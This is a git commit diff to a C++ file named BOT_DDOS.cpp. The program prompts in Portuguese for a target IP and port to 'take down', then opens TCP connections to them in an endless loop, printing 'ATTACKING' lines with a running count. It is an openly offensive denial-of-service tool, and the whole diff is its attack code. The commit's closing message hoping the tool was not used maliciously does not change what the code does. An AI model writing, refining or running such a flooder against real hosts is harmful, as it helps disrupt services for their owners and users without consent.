e8c750db1f361a15377ccefb60a4b3be3af2fb45
najatheus1 <72266626+najatheus1@users.noreply.github.com>
2022-08-14 16:00:44 -0300

    Update BOT_DDOS.cpp

--- BOT_DDOS.cpp
+++ BOT_DDOS.cpp
@@ -2,36 +2,49 @@
 
 int main(void)
 {
-	SetConsoleTitle("BOT DDOS ( BY : SRNAJA )");
-	int port;
+	SetConsoleTitle("BOT DOS ( BY : SRNAJA )");
+	int port, count;
 	char ip[50];
 	std::cout << "DIGITE O IP QUE VOCE DESEJA DERRUBAR : \n";
 	std::cin >> ip;
 	std::cout << "DIGITE A PORTA QUE VOCE DESEJA DERRUBAR : \n";
 	std::cin >> port;
-
 	std::system("cls");
 
+	count = 0x0;
+
 	while (true) {
-		Socket so(ip, port, 10, SOCK_STREAM, AF_INET, 0);
+		Sleep(300);
 
-		so.registerAddr();
+		while (true) {
+			Socket so(ip, port, 10, SOCK_STREAM, AF_INET, 0);
 
-		bool t = so.socket_();
-		if (!t) {
-			std::cout << "problema na criacao do socket!" << std::endl;
-			return 0;
+			so.registerAddr();
+
+			bool t = so.socket_();
+			if (!t) {
+				std::cout << "problema na criacao do socket!" << std::endl;
+				break;
+			}
+
+			bool f = so.connect_();
+
+			if (!f) {
+				std::cout << "problema na conexao" << std::endl;
+				break;
+			}
+
+			count = count + 1;
+
+			std::cout << "\033[1;31mATACANDO \033[1;32mIP [" << ip << "] \033[1;34mPORT (" << port << ")" << " \033[1;31mQUANTIDADE DE PACOTES ENVIADOS : \033[1;34m" << count << "\n";
 		}
 
-		bool f = so.connect_();
-
-		if (!f) {
-			std::cout << "problema na conexao" << std::endl;
-			return 0;
-		}
-
-		std::cout << "\033[1;31mATACANDO IP [" << ip << "] PORT (" << port << ")\n";
 	}
+
+
+	std::cout << "\033[1;31mDOS PROGRAMA PARADO!\n";
+
+	MessageBox(NULL, "ESPERO QUE VOCE NAO TENHA UTILIZADO O 'BOT DOS ( BY : SRNAJA )' PARA FINS MALICIOSO ", "BOT DOS(BY : SRNAJA)", MB_OK | MB_ICONEXCLAMATION);
 
 	return 0;
 }
